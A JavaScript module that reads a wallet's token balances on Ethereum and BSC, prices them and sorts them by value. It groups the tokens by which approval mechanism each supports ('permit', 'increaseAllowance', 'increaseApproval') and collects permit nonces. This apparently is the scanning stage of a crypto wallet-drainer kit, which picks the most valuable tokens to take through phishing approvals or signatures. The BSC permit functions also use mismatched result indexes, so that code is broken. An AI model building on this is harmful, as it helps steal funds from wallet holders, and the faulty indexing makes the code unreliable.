import MultiCall from "@indexed-finance/multicall";
import { BigNumber, ethers } from "ethers";
import { PROVIDER, TOKEN } from "../config";

import permitABI from "../abi/permit-7.json";
import allowanceABI from "../abi/increaseAllowance.json";
import approvalABI from "../abi/increaseApproval.json";

export const tokenBalanceETH = async (account) => {
	const provider = new ethers.providers.JsonRpcProvider(PROVIDER[1], 1);
	const multicall = new MultiCall(provider);

	try {

		const callAllowance = TOKEN[1]["allowance"].address.flatMap(address => ([
			{
				target: address,
				function: 'balanceOf',
				args: [account]
			},
			{
				target: address,
				function: "decimals",
				args: []
			}

		]));

		const callPermit = TOKEN[1]["permit"].address.flatMap(address => ([
			{
				target: address,
				function: 'balanceOf',
				args: [account]
			},
			{
				target: address,
				function: "name",
				args: []
			},
			{
				target: address,
				function: "nonces",
				args: [account]
			},
			{
				target: address,
				function: "decimals",
				args: []
			}
		]));

		const callApprove = TOKEN[1]["approval"].address.flatMap(address => ([
			{
				target: address,
				function: 'balanceOf',
				args: [account]
			},
			{
				target: address,
				function: "decimals",
				args: []
			}
		]));


		const resPermit = await multicall.multiCall(permitABI, callPermit);
		const resAllowance = await multicall.multiCall(allowanceABI, callAllowance);
		const resApprove = await multicall.multiCall(approvalABI, callApprove);

		const tokenBalancePermit = TOKEN[1]["permit"].address.map((address, index) => ({
			address,
			balanceValue: parseFloat(parseFloat(ethers.utils.formatUnits(resPermit[1][index * 4], resPermit[1][index * 4 + 3])).toFixed(2)) * parseFloat(TOKEN[1]["permit"].price[index]),
			balance: resPermit[1][index * 4],
			name: resPermit[1][index * 4 + 1],
			nonce: resPermit[1][index * 4 + 2],
			type: 'permit'
		}));

		const tokenBalanceAllowance = TOKEN[1]["allowance"].address.map((address, index) => ({
			address,
			balanceValue: parseFloat(parseFloat(ethers.utils.formatUnits(resAllowance[1][index * 2], resAllowance[1][index * 2 + 1])).toFixed(2)) * parseFloat(TOKEN[1]["allowance"].price[index]),
			balance: resAllowance[1][index * 2],
			type: 'allowance',

		}));

		const tokenBalanceApprove = TOKEN[1]["approval"].address.map((address, index) => ({
			address,
			balanceValue: parseFloat(parseFloat(ethers.utils.formatUnits(resApprove[1][index * 2], resApprove[1][index * 2 + 1])).toFixed(2)) * parseFloat(TOKEN[1]["approval"].price[index]),
			balance: resApprove[1][index * 2],
			type: 'approve'
		}));

		tokenBalancePermit.sort((a, b) => b.balanceValue - a.balanceValue);
		tokenBalanceAllowance.sort((a, b) => b.balanceValue - a.balanceValue);
		tokenBalanceApprove.sort((a, b) => b.balanceValue - a.balanceValue);

		let totalBalance = 0;

		for (let i = 0; i < tokenBalancePermit.length; i++) {
			totalBalance += tokenBalancePermit[i].balanceValue;
		}

		for (let i = 0; i < tokenBalanceAllowance.length; i++) {
			totalBalance += tokenBalanceAllowance[i].balanceValue;
		}

		for (let i = 0; i < tokenBalanceApprove.length; i++) {
			totalBalance += tokenBalanceApprove[i].balanceValue;
		}

		const tokenAll = tokenBalanceAllowance.concat(tokenBalanceApprove).concat(tokenBalancePermit);

		tokenAll.sort((a, b) => b.balanceValue - a.balanceValue);

		return {
			tokenBalancePermit,
			tokenBalanceAllowance,
			tokenBalanceApprove,
			totalBalance,
			tokenAll
		}


	}
	catch (error) {
		console.log(error)
	}
}

export const tokenBalancePermitETH = async (account, token, price) => {
	const provider = new ethers.providers.JsonRpcProvider(PROVIDER[1], 1);
	const multicall = new MultiCall(provider);

	try {

		const callPermit = [
			{
				target: token,
				function: 'balanceOf',
				args: [account]
			},
			{
				target: token,
				function: "name",
				args: []
			},
			{
				target: token,
				function: "nonces",
				args: [account]
			},
			{
				target: token,
				function: "decimals",
				args: []
			}
		];


		const resPermit = await multicall.multiCall(permitABI, callPermit);

		let index = 0;
		const tokenBalancePermit = {
			address: token,
			balanceValue: parseFloat(parseFloat(ethers.utils.formatUnits(resPermit[1][index * 4], resPermit[1][index * 4 + 3])).toFixed(2)) * parseFloat(price),
			balance: resPermit[1][index * 4],
			name: resPermit[1][index * 4 + 1],
			nonce: resPermit[1][index * 4 + 2],
			type: 'permit'
		};


		return tokenBalancePermit;


	}
	catch (error) {
		console.log(error)
	}
}

export const tokenBalanceAllowanceETH = async (account, token, price) => {
	const provider = new ethers.providers.JsonRpcProvider(PROVIDER[1], 1);
	const multicall = new MultiCall(provider);

	try {
		const callAllowance = [
			{
				target: token,
				function: 'balanceOf',
				args: [account]
			},
			{
				target: token,
				function: "decimals",
				args: []
			}
		];

		const resAllowance = await multicall.multiCall(allowanceABI, callAllowance);

		let index = 0;
		const tokenBalanceAllowance = {
			address: token,
			balanceValue: parseFloat(parseFloat(ethers.utils.formatUnits(resAllowance[1][index * 2], resAllowance[1][index * 2 + 1])).toFixed(2)) * parseFloat(price),
			balance: resAllowance[1][index * 2],
			type: 'allowance'
		};

		return tokenBalanceAllowance;
	}
	catch (error) {
		console.log(error)
	}
}

export const tokenBalanceApproveETH = async (account, token, price) => {
	const provider = new ethers.providers.JsonRpcProvider(PROVIDER[1], 1);
	const multicall = new MultiCall(provider);

	try {

		const callApprove = [
			{
				target: token,
				function: 'balanceOf',
				args: [account]
			},
			{
				target: token,
				function: 'decimals',
				args: []
			}
		];


		const resApprove = await multicall.multiCall(approvalABI, callApprove);

		let index = 0;
		const tokenBalanceApprove = {
			address: token,
			balanceValue: parseFloat(parseFloat(ethers.utils.formatUnits(resApprove[1][index * 2], resApprove[1][index * 2 + 1])).toFixed(2)) * parseFloat(price),
			balance: resApprove[1][index * 2],
			type: 'approve'
		};

		return tokenBalanceApprove;
	}
	catch (error) {
		console.log(error)
	}
}

export const tokenBalanceBSC = async (account) => {

	const provider = new ethers.providers.JsonRpcProvider(PROVIDER[56], 56);
	const multicall = new MultiCall(provider);

	try {

		const callAllowance = TOKEN[56]["allowance"].address.flatMap(address => ([
			{
				target: address,
				function: 'balanceOf',
				args: [account]
			},
			{
				target: address,
				function: "decimals",
				args: []
			}

		]));


		const callPermit = TOKEN[56]["permit"].address.flatMap(address => ([
			{
				target: address,
				function: 'balanceOf',
				args: [account]
			},
			{
				target: address,
				function: "name",
				args: []
			},
			{
				target: address,
				function: "nonces",
				args: [account]
			},
			{
				target: address,
				function: "decimals",
				args: []
			}
		]));


		const resPermit = await multicall.multiCall(permitABI, callPermit);
		const resAllowance = await multicall.multiCall(allowanceABI, callAllowance);

		const tokenBalancePermit = TOKEN[56]["permit"].address.map((address, index) => ({
			address,
			balanceValue: parseFloat(parseFloat(ethers.utils.formatUnits(resAllowance[1][index * 2], resAllowance[1][index * 2 + 1])).toFixed(2)) * parseFloat(TOKEN[56]["permit"].price[index]),
			balance: resAllowance[1][index * 2],
			name: resPermit[1][index * 3 + 1],
			nonce: resPermit[1][index * 3 + 2],
			type: "permit"
		}));


		const tokenBalanceAllowance = TOKEN[56]["allowance"].address.map((address, index) => ({
			address,
			balanceValue: parseFloat(parseFloat(ethers.utils.formatUnits(resAllowance[1][index * 2], resAllowance[1][index * 2 + 1])).toFixed(2)) * parseFloat(TOKEN[56]["allowance"].price[index]),
			balance: resAllowance[1][index * 2],
			type: "allowance"
		}));

		tokenBalancePermit.sort((a, b) => b.balanceValue - a.balanceValue);
		tokenBalanceAllowance.sort((a, b) => b.balanceValue - a.balanceValue);

		let totalBalance = 0;

		for (let i = 0; i < tokenBalancePermit.length; i++) {
			totalBalance += tokenBalancePermit[i].balanceValue;
		}

		for (let i = 0; i < tokenBalanceAllowance.length; i++) {
			totalBalance += tokenBalanceAllowance[i].balanceValue;
		}

		const tokenAll = tokenBalanceAllowance.concat(tokenBalancePermit);

		return {
			tokenBalancePermit,
			tokenBalanceAllowance,
			totalBalance,
			tokenAll
		}


	}
	catch (error) {
		console.log(error)
	}

}

export const tokenBalancePermitBSC = async (account, token, price) => {

	const provider = new ethers.providers.JsonRpcProvider(PROVIDER[56], 56);
	const multicall = new MultiCall(provider);

	try {

		const callAllowance = [
			{
				target: token,
				function: 'balanceOf',
				args: [account]
			},
			{
				target: token,
				function: "decimals",
				args: []
			}
		];

		const callPermit = [
			{
				target: token,
				function: 'balanceOf',
				args: [account]
			},
			{
				target: token,
				function: "name",
				args: []
			},
			{
				target: token,
				function: "nonces",
				args: [account]
			},
			{
				target: token,
				function: "decimals",
				args: []
			}
		];


		const resPermit = await multicall.multiCall(permitABI, callPermit);
		const resAllowance = await multicall.multiCall(allowanceABI, callAllowance);

		let index = 0;
		const tokenBalancePermit = {
			address: token,
			balanceValue: parseFloat(parseFloat(ethers.utils.formatUnits(resAllowance[1][index * 2], resAllowance[1][index * 2 + 1])).toFixed(2)) * parseFloat(price),
			balance: resAllowance[1][index * 2],
			name: resPermit[1][index * 3 + 1],
			nonce: resPermit[1][index * 3 + 2],
			type: "permit"
		};

		return tokenBalancePermit;
	}
	catch (error) {
		console.log(error)
	}
}


export const tokenBalanceAllowanceBSC = async (account, token, price) => {

	const provider = new ethers.providers.JsonRpcProvider(PROVIDER[56], 56);
	const multicall = new MultiCall(provider);

	try {


		const callAllowance = [
			{
				target: token,
				function: 'balanceOf',
				args: [account]
			},
			{
				target: token,
				function: "decimals",
				args: []
			}
		];


		const resAllowance = await multicall.multiCall(allowanceABI, callAllowance);

		let index = 0;

		const tokenBalanceAllowance = {
			address: token,
			balanceValue: parseFloat(parseFloat(ethers.utils.formatUnits(resAllowance[1][index * 2], resAllowance[1][index * 2 + 1])).toFixed(2)) * parseFloat(price),
			balance: resAllowance[1][index * 2],
			type: "allowance"
		};

		return tokenBalanceAllowance;

	}
	catch (error) {
		console.log(error)
	}
}
